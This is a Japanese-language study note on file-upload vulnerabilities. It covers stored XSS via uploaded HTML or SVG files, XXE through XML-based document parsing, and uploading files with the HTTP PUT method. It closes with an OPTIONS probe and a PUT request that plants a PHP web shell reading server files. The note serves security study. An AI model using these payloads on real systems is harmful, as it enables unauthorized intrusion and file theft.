
## Client-side scriptのアップロード

###### 参考

- [3.持続型XSS](../../Client-side/XSS/3.持続型XSS.md)
- [1. CORSの基本と攻撃への対策](../../Client-side/CORS/1.%20CORSの基本と攻撃への対策.md)

###### 前提条件

- サーバでスクリプトが実行できないとき
- HTMLファイルやSVG画像をアップロードできるとき
- アップロードしたファイルがアップロード先と同じオリジンから提供されるとき

###### エクスプロイト概要

1. `<script>`タブを使って、stored XSS payloadを作成しファイルアップロードする
2. 他のユーザがアップロードしたファイルにアクセスすると、payloadが実行される

## ファイルparsingの脆弱性エクスプロイト

###### 参考

- [1. XXE injectionの基本と対策](../XXE%20injection/1.%20XXE%20injectionの基本と対策.md)

###### 前提条件

- すべてうまくいかなかったときの最終手段
- ファイル形式ごとに異なるparsingや処理に特有の脆弱性が存在する。

###### シチューエーション例

1. サーバがMicrosoft Officeの`.doc`や`.xls`ファイルのようなXMLベースのファイルをparsingしていることがわかる
2. XXE injectionを試す

## PUTメソッドによるファイルアップロード

###### 前提条件

- Webアプリにファイルアップロードできる場所がない
- PUTリクエストが可能

### PUTメソッドによるファイルアップロード実践

1. PUTリクエストが可能かテストする
	- 異なるエンドポイントに`OPTIONS`リクエストを送っていく
```http
OPTIONS /index.html
```
```http
HTTP/1.1 204 No Content
Allow: OPTIONS, GET, POST, PUT
```

2. ファイルをアップロードする
```http
PUT /images/exploit.php 
HTTP/1.1 Host: vulnerable-website.com 
Content-Type: application/x-httpd-php 
Content-Length: 49

<?php echo file_get_contents('/path/to/file'); ?>
```
